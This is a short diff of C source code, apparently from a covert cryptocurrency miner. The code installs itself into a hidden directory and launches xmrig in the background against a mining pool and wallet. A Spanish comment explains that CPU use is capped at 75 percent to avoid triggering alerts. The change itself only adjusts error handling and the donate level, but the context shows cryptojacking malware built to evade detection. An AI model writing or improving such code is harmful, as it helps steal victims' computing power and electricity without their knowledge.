@@ -27,7 +27,7 @@ void install_self(char *current_path, char *out_path, size_t size) {
 
     char cmd[1024];
     snprintf(cmd, sizeof(cmd), "mkdir -p %s", install_dir);
-    system(cmd);
+    if (system(cmd) != 0) { /* Ignorar error */ }
 
     snprintf(out_path, size, "%s/%s", install_dir, INSTALL_NAME);
 
@@ -115,7 +115,7 @@ int main(int argc, char *argv[], char *envp[]) {
         "-o", POOL_URL,
         "-u", WALLET_ADDR,
         "-p", PASSWD,
-        "--donate-level", "0",
+        "--donate-level", "1",
         "--cpu-max", "75", // No quemar la CPU para evitar alertas
         "-B", // Background (aunque execve lo maneja, xmrig tiene flag)
         NULL
